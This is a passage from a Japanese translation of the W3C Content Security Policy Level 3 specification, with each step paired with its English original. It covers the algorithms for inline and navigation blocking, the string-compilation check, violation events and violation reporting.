Given an Element (element), a string (type), and a string (source) this algorithm returns "Allowed" if the element is allowed to have inline definition of a particular type of behavior (script execution, style application, event handlers, etc.), and "Blocked" otherwise:
</p>

<ol>
	<li>
~Assert：
%型 ~IN { `script^l, `script attribute^l, `style^l, `style attribute^l }
◎
Note: The valid values for type are "script", "script attribute", "style", and "style attribute".
</li>
	<li>
~Assert：
%要素 ~NEQ ~NULL
◎
Assert: element is not null.
</li>
	<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
	<li>
<p>
%要素 の`文書$の`大域~obj$の`~CSP~list$gO 内の
~EACH( %施策 )
に対し：
◎
For each policy in element’s Document's global object’s CSP list:
</p>
		<ol>
			<li>
<p>
%施策 の`指令~集合$内の
~EACH( %指令 )
に対し：
◎
For each directive in policy’s directive set:
</p>
				<ol>
					<li>
~IF［
%指令 の`~inline検査$A( %要素, %型, %~source )
の結果 ~EQ `許容ed^i 
］
⇒
~CONTINUE
◎
If directive’s inline check returns "Allowed" when executed upon element, type, and source, skip to the next directive.
</li>
					<li>
%違反 ~LET `新たな違反~obj$A1(
`現在の設定群~obj$の`大域~obj$enV, %施策, %指令 の`名前$
)
◎
Otherwise, let violation be the result of executing §2.4.1 Create a violation object for global, policy, and directive on the current settings object’s global object, policy, and directive’s name.
</li>
					<li>
%違反 の`資源$vr ~SET `inline^l
◎
Set violation’s resource to "inline".
</li>
					<li>
%違反 の`要素$vr ~SET %要素
◎
Set violation’s element to element.
</li>
					<li>
~IF［
`report-sample^pl `~IN$ ［
%指令 の`値$
］］
⇒
%指令 の`見本$vr ~SET %~source の最初の 40 文字からなる文字列
◎
If directive’s value contains the expression "'report-sample'", then set violation’s sample to the substring of source containing its first 40 characters.
</li>
					<li>
`違反を報告する$A( %違反 )
◎
Execute §5.3 Report a violation on violation.
</li>
					<li>
~IF［
%施策 の`処置先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>
	<li>
~RET %結果
◎
Return result.
</li>
</ol>


			</section>
			<section id="should-block-navigation-request">
<h4 title="Should navigation request of type from source in target be blocked by Content Security Policy?">4.2.5. %~source から %~target を~navigateするある %種別 の %要請 は~CSPにより阻止されるべきか？</h4>


<p>
この~algoは、所与の (
`要請$ %~navi要請,
文字列 %種別,
`閲覧文脈$ %~source,
`閲覧文脈$ %~target
)
に対し，［
作動中の施策が~naviを阻止するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］を返す：
◎
Given a request (navigation request), a string (type, either "form-submission" or "other"), and two browsing contexts (source and target), this algorithm return "Blocked" if the active policy blocks the navigation, and "Allowed" otherwise:
</p>

<ol>
	<li>
~Assert：
%種別 ~IN { `form-submission^l, `other^l }
◎
↑</li>
	<li>
%~CSP~list ~LET %~source にて`作動中の文書$の`~CSP~list$doc
◎
↓</li>
	<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
	<li>
<p>
%~CSP~list 内の~EACH( %施策 )
に対し：
◎
For each policy in source’s active document’s CSP list:
</p>

		<ol>
			<li>
<p>
%施策 内の~EACH( %指令 )
に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
~IF［
%指令 の`~navi前~検査$A( %~navi要請, %種別, %~source, %~target, %施策 )
~EQ `許容ed^i
］
⇒
~CONTINUE
◎
If directive’s pre-navigation check returns "Allowed" when executed upon navigation request, type, source, target, and policy skip to the next directive.
</li>
					<li>
%違反 ~LET `新たな違反~obj$A1(
%~source に`関連する大域~obj$【？】, %施策, %指令 の`名前$
)
◎
Otherwise, let violation be the result of executing §2.4.1 Create a violation object for global, policy, and directive on source’s relevant global object, policy, and directive’s name.
</li>
					<li>
%違反 の`資源$vr ~SET %~navi要請 の`~url$rs
◎
Set violation’s resource to navigation request’s URL.
</li>
					<li>
`違反を報告する$A( %違反 )
◎
Execute §5.3 Report a violation on violation.
</li>
					<li>
~IF［
%施策 の`処置先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>
	<li>
~IF［
%結果 ~EQ  `阻止ed^i
］~OR［
%~navi要請 の`~url$rqの`~scheme$url ~NEQ `javascript^l
］
⇒
~RET %結果
◎
If result is "Allowed", and if navigation request’s url’s scheme is javascript:
</li>
	<li>
<p>
%~CSP~list 内の
~EACH( %施策 )
に対し：
◎
For each policy in source’s active document’s CSP List:
</p>
		<ol>
			<li>
<p>
%施策 内の
~EACH( %指令 )
に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
~IF［
%指令 の`~inline検査$A( ~NULL, `navigation^l, %~navi要請 の`~url$rs )
の結果 ~EQ `許容ed^i
］
⇒
~CONTINUE
◎
If directive’s inline check returns "Allowed" when executed upon null, "navigation" and navigation request’s url, skip to the next directive.
</li>
					<li>
%違反 ~LET
`新たな違反~obj$A1( %~source に`関連する大域~obj$【？】, %施策, %指令 の`名前$ )
◎
Otherwise, let violation be the result of executing §2.4.1 Create a violation object for global, policy, and directive on source’s relevant global object, policy, and directive’s name.
</li>
					<li>
%違反 の`資源$vr ~SET %~navi要請 の`~url$rs
◎
Set violation’s resource to navigation request’s URL.
</li>
					<li>
`違反を報告する$A( %違反 )
◎
Execute §5.3 Report a violation on violation.
</li>
					<li>
~IF［
%施策 の`処置先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>
	<li>
~RET %結果
◎
Return result.
</li>
</ol>


			</section>
			<section id="should-block-navigation-response">
<h4 title="Should navigation response to navigation request of type from source in target be blocked by Content Security Policy?">4.2.6. %~source から %~target を~navigateするある %種別 の %要請 に対する %応答 は~CSPにより阻止されるべきか？</h4>


<p>
この~algoは、所与の (
`要請$ %~navi要請,
文字列 %種別,
`応答$ %~navi応答,
`閲覧文脈$ %~source,
`閲覧文脈$ %~target
) に対し，［
作動中の施策が~naviを阻止するならば `阻止ed^i ／
~ELSE_ `許容ed^i
］を返す：
◎
Given a request (navigation request), a string (type, either "form-submission" or "other"), a response navigation response, and two browsing contexts (source and target), this algorithm returns "Blocked" if the active policy blocks the navigation, and "Allowed" otherwise:
</p>

<ol>
	<li>
~Assert：
%種別 ~IN { `form-submission^l, `other^l }
◎
↑</li>
	<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
	<li>
<p>
%~navi応答 の`~CSP~list$rs内の
~EACH( %施策 )
に対し：
◎
For each policy in navigation response’s CSP list:
</p>

<p class="note">注記：
一部の指令（ `frame-ancestors$dir など）は、
%応答 の`~CSP$が~naviに動作することを許容する。
◎
Note: Some directives (like frame-ancestors) allow a response’s Content Security Policy to act on the navigation.
</p>

		<ol>
			<li>
<p>
%施策 内の
~EACH( %指令 )
に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
~IF［
%指令 の`~navi応答~検査$A(
%~navi要請,
%種別,
%~navi応答,
%~source,
%~target
`response^l,
%施策
)
~EQ `許容ed^i
］
⇒
~CONTINUE
◎
If directive’s navigation response check returns "Allowed" when executed upon navigation request, type, navigation response, source, target, "response", and policy skip to the next directive.
</li>
					<li>
<p>
%違反 ~LET `新たな違反~obj$A1(
~NULL, %施策, %指令 の`名前$
)
◎
Otherwise, let violation be the result of executing §2.4.1 Create a violation object for global, policy, and directive on null, policy, and directive’s name.
</p>

<p class="note">注記：
大域~objは存在しないので、大域~objとして ~NULL を利用する
— ~naviは、 `Document^I が作成される所までは まだ処理されていない。
◎
Note: We use null for the global object, as no global exists: we haven’t processed the navigation to create a Document yet.
</p>
					</li>
					<li>
%違反 の`資源$vr ~SET %~navi応答 の`~url$rs
◎
Set violation’s resource to navigation response’s URL.
</li>
					<li>
`違反を報告する$A( %違反 )
◎
Execute §5.3 Report a violation on violation.
</li>
					<li>
~IF［
%施策 の`処置先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>
	<li>
<p>
%~CSP~list 内の
~EACH( %施策 )
に対し：
◎
For each policy in source’s active document’s CSP List:
</p>

<p class="note">注記：
%~source 文脈における一部の指令（ `navigate-to$dir など）は、~naviに動作する前に %応答 を必要とする。
◎
Note: Some directives in the source context (like navigate-to) need the response before acting on the navigation.
</p>
		<ol>
			<li>
<p>
%施策 内の
~EACH( %指令 )
に対し：
◎
For each directive in policy:
</p>
				<ol>
					<li>
~IF［
%指令 の`~navi応答~検査$A(
%~navi要請,
%種別,
%~navi応答,
%~source,
%~target,
`source^l,
%施策
)
~EQ `許容ed^i
］
⇒
~CONTINUE
◎
If directive’s navigation response check returns "Allowed" when executed upon navigation request, type, navigation response, source, target, "source", and policy skip to the next directive.
</li>
					<li>
%違反 ~LET `新たな違反~obj$A1(
%~source に`関連する大域~obj$【？】, %施策, %指令 の`名前$
)
◎
Otherwise, let violation be the result of executing §2.4.1 Create a violation object for global, policy, and directive on source’s relevant global object, policy, and directive’s name.
</li>
					<li>
%違反 の`資源$vr ~SET %~navi要請 の`~url$rs
◎
Set violation’s resource to navigation request’s URL.
</li>
					<li>
`違反を報告する$A( %違反 )
◎
Execute §5.3 Report a violation on violation.
</li>
					<li>
~IF［
%施策 の`処置先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
				</ol>
			</li>
		</ol>
	</li>
	<li>
~RET %結果
◎
Return result.
</li>
</ol>

			</section>
		</section>
		<section id="ecma-integration">
<h3 title="Integration with ECMAScript">4.3. ECMAScript との統合</h3>


<p>
ECMAScript では、~host環境が 文字列から ECMAScript ~codeへの~compilationを阻止できるようにする
`HostEnsureCanCompileStrings$jA()
抽象演算が定義されている。
この文書は、その抽象演算の実装を定義する
— それは、関連する`~CSP~list$gOを精査して，そのような~compilationは阻止されるべきかどうか決定する。
◎
ECMAScript defines a HostEnsureCanCompileStrings() abstract operation which allows the host environment to block the compilation of strings into ECMAScript code. This document defines an implementation of that abstract operation thich examines the relevant CSP list to determine whether such compilation ought to be blocked.
</p>



			<section id="can-compile-strings">
<h4>4.3.1. `EnsureCSPDoesNotBlockStringCompilation^jA(%callerRealm, %calleeRealm, %source)</h4>

<p>
この~algoは、所与の 2 つの`~realm$
( %callerRealm, %calleeRealm ),
および
( 【~scriptの~sourceを与える文字列】%~source )
に対し，文字列の~compilationが許容されないならば `EvalError^E を投出し，他の場合は何もしない：
◎
Given two realms (callerRealm and calleeRealm), and a string (source), this algorithm returns normally if string compilation is allowed, and throws an "EvalError" if not:
</p>

<ol>
	<li>
%大域~obj~list ~LET ［
%callerRealm の`大域~obj$rM, %calleeRealm の`大域~obj$rM
］からなる~list
◎
Let globals be a list containing callerRealm’s global object and calleeRealm’s global object.
</li>
	<li>
<p>
%大域~obj~list 内の
~EACH( %大域~obj )
に対し：
◎
For each global in globals:
</p>
		<ol>
			<li>
%結果 ~LET `許容ed^i
◎
Let result be "Allowed".
</li>
			<li>
<p>
%大域~obj の`~CSP~list$gO内の
~EACH( %施策 )
に対し：
◎
For each policy in global’s CSP list:
</p>
				<ol>
					<li>
%~source~list ~LET ~NULL
◎
Let source-list be null.
</li>
					<li>
~IF［
%施策 内に［
`名前$ ~EQ `script-src^l
］なる`指令$はある
］
⇒
%~source~list ~SET その`指令$の`値$
◎
If policy contains a directive whose name is "script-src", then set source-list to that directive's value.
</li>
					<li>
~ELIF［
%施策 内に［
`名前$ ~EQ `default-src^l
］なる`指令$はある
］
⇒
%~source~list ~SET その`指令$の`値$
◎
Otherwise if policy contains a directive whose name is "default-src", then set source-list to that directive’s value.
</li>
					<li>
<p>
~IF［
%~source~list ~NEQ ~NULL
］~AND［
%~source~list は［
`~source式$ ~EQ`~ACI$ `unsafe-eval$pl
］を包含しない
］：
◎
If source-list is not null, and does not contain a source expression which is an ASCII case-insensitive match for the string "'unsafe-eval'", then:
</p>
						<ol>
							<li>
%違反 ~LET `新たな違反~obj$A1(
%大域~obj, %施策, `script-src$dir
)
◎
Let violation be the result of executing §2.4.1 Create a violation object for global, policy, and directive on global, policy, and "script-src".
</li>
							<li>
%違反 の`資源$vr ~SET `inline^l
◎
Set violation’s resource to "inline".
</li>
							<li>
~IF［
`report-sample^pl `~IN$ %~source~list
］
⇒
%指令 の`見本$vr ~SET %~source の最初の 40 文字からなる文字列
◎
If source-list contains the expression "'report-sample'", then set violation’s sample to the substring of source containing its first 40 characters.
</li>
							<li>
`違反を報告する$A( %違反 )
◎
Execute §5.3 Report a violation on violation.
</li>
							<li>
~IF［
%施策 の`処置先$ ~EQ `enforce^l
］
⇒
%結果 ~SET `阻止ed^i
◎
If policy’s disposition is "enforce", then set result to "Blocked".
</li>
						</ol>
					</li>
				</ol>
			</li>
			<li>
~IF［
%結果 ~EQ `阻止ed^i
］
⇒
~THROW `EvalError^E
◎
If result is "Blocked", throw an EvalError exception.
</li>
		</ol>
	</li>
</ol>

<p class="issue">
`HostEnsureCanCompileStrings$jA()
は、~compileされようとしている文字列を~parameterにとらない。
その値が~CSPを通して~pipeされるよう，~HTMLを更新する必要がある。
<a href="https://github.com/tc39/ecma262/issues/938">&lt;https://github.com/tc39/ecma262/issues/938&gt;</a>
◎
HostEnsureCanCompileStrings() does not include the string which is going to be compiled as a parameter. We’ll also need to update HTML to pipe that value through to CSP. &lt;https://github.com/tc39/ecma262/issues/938&gt;
</p>


			</section>
		</section>
	</section>
	<section id="reporting">
<h2 title="Reporting">5. 報告-法</h2>

<p>
一つ以上の`施策$の指令が違反されたときは、
`違反~報告@
が生成され，［
`施策$に結付けられている`報告先$（ `reporting endpoint^en ）
］に向けて送信されてよい。
◎
When one or more of a policy’s directives is violated, a violation report may be generated and sent out to a reporting endpoint associated with the policy.
</p>



		<section id="violation-events">
<h3 title="Violation DOM Events">5.1. 違反 DOM ~event</h3>

<pre class="idl">
enum `SecurityPolicyViolationEventDisposition@I {
  `enforce@l, `report@l
};

[`Constructor@m(
  DOMString %type,
  optional `SecurityPolicyViolationEventInit$I %eventInitDict
)]
interface `SecurityPolicyViolationEvent@I : `Event$I {
    readonly attribute USVString      `documentURI@m;
    readonly attribute USVString      `referrer@m;
    readonly attribute USVString      `blockedURI@m;
    readonly attribute DOMString      `violatedDirective@m;
    readonly attribute DOMString      `effectiveDirective@m;
    readonly attribute DOMString      `originalPolicy@m;
    readonly attribute USVString      `sourceFile@m;
    readonly attribute DOMString      `sample@m;
    readonly attribute `SecurityPolicyViolationEventDisposition$I `disposition@m;
    readonly attribute unsigned short `statusCode@m;
    readonly attribute unsigned long  `lineNumber@m;
    readonly attribute unsigned long  `columnNumber@m;
};

dictionary `SecurityPolicyViolationEventInit@I : `EventInit$I {
    required USVString      `documentURI@d;
             USVString      `referrer@d = "";
             USVString      `blockedURI@d = "";
    required DOMString      `violatedDirective@d;
    required DOMString      `effectiveDirective@d;
    required DOMString      `originalPolicy@d;
             USVString      `sourceFile@d = "";
             DOMString      `sample@d = "";
    required `SecurityPolicyViolationEventDisposition$I `disposition@d;
    required unsigned short `statusCode@d;
             unsigned long  `lineNumber@d = 0;
             unsigned long  `columnNumber@d = 0;
 };
</pre>

		</section>
		<section id="deprecated-serialize-violation">
<h3 title="Obtain the deprecated serialization of violation">5.2. %違反 の直列化を得る（非推奨）</h3>

<p>
次の~algoは、所与の
( `違反$ %違反 )
に対し，%違反 を表現する JSON ~text文字列を［［
非推奨にされた `report-uri$dir 指令
］に結付けられている`報告先$への提出に相応しい形
］にして返す：
◎
Given a violation (violation), this algorithm returns a JSON text string representation of the violation, suitable for submission to a reporting endpoint associated with the deprecated report-uri directive.
</p>

<ol>
	<li>
<p>
%~obj ~LET
各種~propが次のように初期化された，新たな~JS ~obj
◎
Let object be a new JavaScript object with properties initialized as follows:
</p>
		<ul>
			<li>
`document-uri^l ~SET
`~URLを直列化する$( %違反 の`~url$vr, `素片は除外する^i )
◎
"document-uri"
• The result of executing the URL serializer on violation’s url, with the exclude fragment flag set.
</li>
			<li>
`referrer^l ~SET
`~URLを直列化する$( %違反 の`~referrer$vr, `素片は除外する^i )
◎
"referrer"
• The result of executing the URL serializer on violation’s referrer, with the exclude fragment flag set.
</li>
			<li>
`blocked-uri^l ~SET
`~URLを直列化する$( %違反 の`資源$vr, `素片は除外する^i )
◎
"blocked-uri"
• The result of executing the URL serializer on violation’s resource, with the exclude fragment flag set.
</li>
			<li>
`effective-directive^l ~SET 
%違反 の`有効な指令$vr
◎
"effective-directive"
• violation’s effective directive
</li>
			<li>
`violated-directive^l ~SET
%違反 の`有効な指令$vr
◎
"violated-directive"
• violation’s effective directive
</li>
			<li>
`original-policy^l ~SET
%違反 の`施策$vrを`直列化-$した結果
◎
"original-policy"
• The serialization of violation’s policy
</li>
			<li>
`disposition^l ~SET %違反 の`施策$vrの`処置先$
◎
"disposition"
• The disposition of violation’s policy
</li>
			<li>
`status-code^l ~SET
%違反 の`状態code$vr
◎
"status-code"
• violation’s status
</li>
			<li>
<p>
`script-sample^l ~SET %違反 の`見本$vr
◎
"script-sample"
• violation’s sample
</p>

<p class="note">注記：
名前 `script-sample^l が選ばれたのは、 Firefox による~CSPの初期~実装で出荷された，この特色機能の早期実装との互換性のためである。
この名前にかかわらず，この~fieldは、~stylesheetの様な非~script 違反に対する見本も包含することになる。
［
`SecurityPolicyViolationEvent$I ~obj ／
新たな `report-to$dir 指令を介して生成される報告
］内に包含される~dataは、より包摂的な名前にされる
— `sample$m のように。
◎
Note: The name script-sample was chosen for compatibility with an earlier iteration of this feature which has shipped in Firefox since its initial implementation of CSP. Despite the name, this field will contain samples for non-script violations, like stylesheets. The data contained in a SecurityPolicyViolationEvent object, and in reports generated via the new report-to directive, is named in a more encompassing fashion: sample.
</p>
			</li>
		</ul>
	</li>
	<li>
<p>
~IF［
%違反 の`~source~file$vr ~NEQ ~NULL
］
⇒
%~obj の各種~propを次のように設定する：
◎
If violation’s source file is not null:
</p>
		<ul>
			<li>
`source-file^l ~SET
`~URLを直列化する$( %違反 の`~source~file$vr, `素片は除外する^i )
◎
Set object’s "source-file" property to the result of executing the URL serializer on violation’s source file, with the exclude fragment flag set.
</li>
			<li>
`line-number^l ~SET %違反 の`行番号$vr
◎
Set object’s "line-number" property to violation’s line number.
</li>
			<li>
`column-number^l ~SET %違反 の`列番号$vr
◎
Set object’s "column-number" property to violation’s column number.
</li>
		</ul>
	</li>
	<li>
~Assert：［
%~obj の `blocked-uri^l ~prop ~NEQ `inline^l
］ならば［
%~obj の `sample^l ~prop ~NEQ 空~文字列
］
◎
Assert: If object’s "blocked-uri" property is not "inline", then its "sample" property is the empty string.
</li>
	<li>
~RET
［
%~obj に対し
`JSON.stringify()$c
を実行した結果
］
◎
Return the result of executing JSON.stringify() on object.
</li>
</ol>



		</section>
		<section id="report-violation">
<h3 title="Report a violation">5.3. %違反 を報告する</h3>

<p>
次の~algoは、所与の
( `違反$ %違反 )
に対し，それを［
%違反 の`施策$vrに指定されている`報告先$
］へ報告するとともに，
%違反 の［
`要素$vr, `大域~obj$vr
］いずれかに向けて
`securitypolicyviolation@et
~eventを発火する：
◎
Given a violation (violation), this algorithm reports it to the endpoint specified in violation’s policy, and fires a SecurityPolicyViolationEvent at violation’s element, or at violation’s global object as described below:
</p>

<ol>
	<li>
%大域~obj ~LET %違反 の`大域~obj$vr
◎
Let global be violation’s global object.
</li>
	<li>
%~target ~LET %違反 の`要素$vr
◎
Let target be violation’s element.
</li>
	<li>
<p>
次の手続きを走らす`~taskを~queueする$：
◎
Queue a task to run the following steps:
</p>

<p class="note">注記：
ここで “~taskを~queueする” のは、~eventを~targetして配送するのが，［
~JSが所与の違反を担当する~taskの実行（それは DOM を操作し得る）を完了した後
］になることを確保するためである。
◎
Note: We "queue a task" here to ensure that the event targeting and dispatch happens after JavaScript completes execution of the task responsible for a given violation (which might manipulate the DOM).
</p>

		<ol>
			<li>
<p>
~IF［
%~target ~NEQ ~NULL
］~AND［
%大域~obj は `Window$I ~objである
］~AND［
%~target の`~shadowも含む根$ ~NEQ %大域~obj に`結付けられている文書$
］
⇒
%~target ~SET ~NULL
◎
If target is not null, and global is a Window, and target’s shadow-including root is not global’s associated Document, set target to null.
</p>


<p class="note">注記：
これは~eventの発火-先になる要素は %違反 の`施策$vrの`文書$に`接続されて$いるものに限られることを確保する。
文書に接続されていない要素により 違反が生じた場合、その違反が文書の~listenerから可視になることを確保するため，~eventは 要素でなく当の文書に向けて発火されるようになる。
◎
Note: This ensures that we fire events only at elements connected to violation’s policy’s Document. If a violation is caused by an element which isn’t connected to that document, we’ll fire the event at the document rather than the element in order to ensure that the violation is visible to the document’s listeners.
</p>
			</li>
			<li>
<p>
~IF［
%~target ~EQ ~NULL
］：
◎
If target is null:
</p>

				<ol>
					<li>
%~target ~SET %大域~obj
◎
Set target be violation’s global object.
</li>
					<li>
~IF［
%~target は `Window$I ~objである
］
⇒
%~target ~SET %~target に`結付けられている文書$
◎
If target is a Window, set target to target’s associated Document.
</li>
				</ol>
			</li>
			<li>
<p>
%~target に向けて，名前 `securitypolicyviolation$et の`~eventを発火する$
— `SecurityPolicyViolationEvent$I ~interfaceを利用し，次のように初期化して：
◎
Fire an event named securitypolicyviolation that uses the SecurityPolicyViolationEvent interface at target with its attributes initialized as follows:
</p>
				<ul>
					<li>
`documentURI$m ~SET
`~URLを直列化する$( %違反 の`~url$vr, `素片は除外する^i )
◎
documentURI
• The result of executing the URL serializer on violation’s url, with the exclude fragment flag set.
</li>
					<li>
`referrer$m ~SET
`~URLを直列化する$( %違反 の`~referrer$vr, `素片は除外する^i )
◎
referrer
• The result of executing the URL serializer on violation’s referrer, with the exclude fragment flag set.
</li>
					<li>
`blockedURI$m ~SET
`~URLを直列化する$( %違反 の`資源$vr, `素片は除外する^i )
◎
blockedURI
• The result of executing the URL serializer on violation’s resource, with the exclude fragment flag set.
</li>
					<li>
`effectiveDirective$m ~SET
%違反 の`有効な指令$vr
◎
effectiveDirective
• violation’s effective directive
</li>
					<li>
`violatedDirective$m ~SET
%違反 の`有効な指令$vr
◎
violatedDirective
• violation’s effective directive
</li>
					<li>
`originalPolicy$m ~SET
%違反 の`施策$vr を`直列化-$した結果
◎
originalPolicy
• The serialization of violation’s policy
</li>
					<li>
`disposition$m ~SET
%違反 の`処置先$vr
◎
disposition
• violation’s disposition
</li>
					<li>
`sourceFile$m ~SET
%違反 の`~source~file$vr に応じて
⇒＃
~NULL ならば 空~文字列 ／
~ELSE_ `~URLを直列化する$( %違反 の`~source~file$vr, `素片は除外する^i )
◎
sourceFile
• The result of executing the URL serializer on violation’s source file, with the exclude fragment flag set if the violation’s source file it not null and the empty string otherwise.
</li>
					<li>
`statusCode$m ~SET
%違反 の`状態code$vr
◎
statusCode
• violation’s status
</li>
					<li>
`lineNumber$m ~SET
%違反 の`行番号$vr
◎
lineNumber
• violation’s line number
</li>
					<li>
`columnNumber$m ~SET
%違反 の`列番号$vr
◎
columnNumber
• violation’s column number
</li>
					<li>
`sample$m ~SET
%違反 の`見本$vr
◎
sample
• violation’s sample
</li>
					<li>
`bubbles$m ~SET ~T
◎
bubbles
• true
</li>
					<li>
`composed$m ~SET ~T
◎
composed
• true
</li>
				</ul>

<p class="note">注記：
［
`effectiveDirective$m, `violatedDirective$m
］の両者とも同じ値にされる。
これは，後方互換性を保守するためであり、意図的である。
◎
Note: Both effectiveDirective and violatedDirective are the same value. This is intentional to maintain backwards compatibility.
</p>

<p class="note">注記：
ここでは `composed$m 属性を設定する。
すなわち、この~eventは ~shadow木にも伝播することになる
— `target$m その他の~~詳細は、~~自動的に，~light木が正しく視野に入るようにされる。
◎
Note: We set the composed attribute, which means that this event can be captured on its way into, and will bubble its way out of a shadow tree. target, et al will be automagically scoped correctly for the main tree.
</p>
			</li>
			<li>
<p>
`(A)^i：<br>
~IF［
%違反 の`施策$vrの`指令~集合$内に［
`名前$ ~EQ  `report-uri$dir
］なる`指令$ %指令 はある
］：
◎
If violation’s policy’s directive set contains a directive named "report-uri" (directive):
</p>
				<ol>
					<li>
~IF［
%違反 の`施策$の`指令~集合$内に［
`名前$ ~EQ `report-to$dir
］なる`指令$はある
］
⇒
~BREAK `(A)^i
◎
If violation’s policy’s directive set contains a directive named "report-to", skip the remaining substeps.
</li>
					<li>
<p>
%指令 の`値$を成す
~EACH( %~token )
に対し：
<!-- ＊splitting不要 -->
◎
For each token returned by splitting a string on ASCII whitespace with directive’s value as the input.
</p>
						<ol>
							<li>
%報告先 ~LET `~URL構文解析する$( %~token, %違反 の`~url$vr )
◎
Let endpoint be the result of executing the URL parser with token as the input, and violation’s url as the base URL.
</li>
							<li>
~IF［
%報告先 ~EQ `失敗^i
］
⇒
~BREAK `(A)^i
◎
If endpoint is not a valid URL, skip the remaining substeps.
</li>
							<li>
<p>
%要請 ~LET
次のように初期化された新たな`要請$：
◎
Let request be a new request, initialized as follows:
</p>
								<ul>
									<li>
`~method$rq ~SET `POST^l
◎
method
• "POST"
</li>
									<li>
`~url$rq ~SET %違反 の`~url$vr
◎
url
• violation’s url
</li>
									<li>
`生成元$rq ~SET
%違反 の`大域~obj$vrに`関連する設定群~obj$の`生成元$enV
◎
origin
• violation’s global object’s relevant settings object’s origin
</li>
									<li>
`~window$rq ~SET `no-window^l
◎
window
• "no-window"
</li>
									<li>
`~client$rq ~SET
%違反 の`大域~obj$vrに`関連する設定群~obj$
◎
client
• violation’s global object’s relevant settings object
</li>
									<li>
`行先$rq ~SET `report^l
◎
destination
• "report"
</li>
									<li>
`起動元$rq ~SET 空~文字列
◎
initiator
• ""
</li>
									<li>
`資格証~mode$rq ~SET `same-origin^l
◎
credentials mode
• "same-origin"
</li>
									<li>
`~keepalive~flag$rq ~SET ~ON
◎
keepalive flag
• "true"
</li>
									<li>
`~header~list$rq ~SET ［
( 名前 ~SET `Content-Type^h / 値 ~SET `application/csp-report^l )
にされた単独の~header
］を包含する`~header~list$
◎
header list
• A header list containing a single header whose name is "Content-Type", and value is "application/csp-report"
</li>
									<li>
`本体$rq ~SET %違反 を`直列化-（非推奨）$Aした結果
◎
body
• The result of executing §5.2 Obtain the deprecated serialization of violation on violation
</li>
									<li>
`~redirect~mode$rq ~SET `error^l
◎
redirect mode
• "error"
</li>
								</ul>

<p class="note">注記：
%要請 の`~mode$rqは既定で `no-cors^l であり、対する応答は まるごと無視される。
◎
Note: request’s mode defaults to "no-cors"; the response is ignored entirely.
</p>

							</li>
							<li>
%要請 を`~fetch$する
— その結果は無視する。
◎
Fetch request. The result will be ignored.
</li>
						</ol>
					</li>
				</ol>

<p class="note">注記：
この段のすべては、非推奨にされたものと見なされるべきである。
これは，違反ごとに単独の要請を送信するため、単純に~scalableでないので。
この挙動は、~UAから除去できるようになり次第，除去される。
◎
Note: All of this should be considered deprecated. It sends a single request per violation, which simply isn’t scalable. As soon as this behavior can be removed from user agents, it will be.
</p>

<p class="note">注記：
`report-uri^dir が効果を発揮するのは、 `report-to^dir が~~不在のときに限られる。
すなわち、後者は前者を上書きし，新たな仕組みを~supportしない~browserとの後方互換性をとれるようにする。
◎
Note: report-uri only takes effect if report-to is not present. That is, the latter overrides the former, allowing for backwards compatibility with browsers that don’t support the new mechanism.
</p>
			</li>
			<li>
<p>
~IF［
%違反 の`施策$の`指令~集合$内に［
`名前$ ~EQ  `report-to$dir
］なる`指令$ %指令 はある
］：
◎
If violation’s policy’s directive set contains a directive named "report-to" (directive):
</p>
				<ol>
					<li>
%~group ~LET %指令 の`値$
◎
Let group be directive’s value.
</li>
					<li>
%設定群~obj ~LET
%違反 の`大域~obj$に`関連する設定群~obj$
◎
Let settings object be violation’s global object’s relevant settings object.
</li>
					<li>
次を与える下で，`報告先~group用に~dataを~queueする$A
`REPORTING$r
⇒＃
%~data ~SET %違反,
%種別 ~SET `CSP^l,
%報告先~group ~SET %~group,
%設定群 ~SET %設定群~obj
◎
Execute [REPORTING]'s Queue data as type for endpoint group on settings algorithm with the following arguments:

data
• violation

type
• "CSP"

endpoint group
• group

settings
• settings object
</li>
				</ol>
			</li>
		</ol>
	</li>
</ol>

		</section>
	</section>
	<section id="csp-directives">
<h2 title="Content Security Policy Directives">6. ~CSP指令</h2>

<div class="p">
<p>
この仕様は、~web開発者が、自身の~siteの挙動のある種の側面を制御できるようにするための，いくつかの型の`指令$を定義する：
</p>

<ul><li>資源の~fetch~~処理を統治する指令（
<a href="#directives-fetch">~fetch指令</a>
節）
</li><li>文書の状態を統治する指令（
<a href="#directives-document">文書~指令</a>
節）
</li><li>~naviのある側面を統治する指令（
<a href="#directives-navigation">~navi指令</a>
節）
</li><li>報告-法を統治する指令（
<a href="#directives-reporting">指令の報告-法</a>
節）
</li></ul>

<p>
これらは，~CSPの中核を形成し、他の指令は補佐的な文書にて~modularに定義される（
<a href="#directives-elsewhere">他の文書にて定義される指令</a>
節にて例を見れる）。
</p>

◎
This specification defines a number of types of directives which allow developers to control certain aspects of their sites' behavior. This document defines directives which govern resource fetching (in §6.1 Fetch Directives), directives which govern the state of a document (in §6.2 Document Directives), directives which govern aspects of navigation (in §6.3 Navigation Directives), and directives which govern reporting (in §6.4 Reporting Directives). These form the core of Content Security Policy; other directives are defined in a modular fashion in ancillary documents (see §6.5 Directives Defined in Other Documents for examples).
</div>

<p>
~web開発者は、~XSS攻撃による~riskを軽減するため，次のいずれかの指令を含ませて［
~script／~plugin
］の~sourceを規制する~SHOULDである：
◎
To mitigate the risk of cross-site scripting attacks, web developers SHOULD include directives that regulate sources of script and plugins. They can do so by including:
</p>

<ul>
	<li>
［
`script-src$dir, `object-src$dir
